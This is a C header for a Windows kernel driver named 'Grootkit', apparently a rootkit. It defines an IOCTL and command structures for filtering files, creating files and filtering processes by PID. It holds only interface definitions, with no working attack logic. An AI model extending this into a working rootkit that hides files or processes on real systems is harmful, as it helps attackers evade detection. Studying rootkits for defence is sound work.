#pragma once
#include<ntddk.h>

#define GROOTKIT_DEVICE 0x8000

#define IOCTL_GROOTKIT CTL_CODE(GROOTKIT_DEVICE,0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

struct FileFilterData {
	PUNICODE_STRING filePath;
};

struct FileCreationData {
	PUNICODE_STRING filePath;
	PUNICODE_STRING data;
};

struct ProcessFilterData {
	UINT32 pid;
};

struct ProcessCreationData {
	
};

union CommandData
{
	FileFilterData FileFilter;
	FileCreationData FileCreation;
	ProcessFilterData ProcessFilter;
	ProcessCreationData ProcessCreation;
};

struct GrootkitData {
	UINT16 whichCommand;
	CommandData command;
};


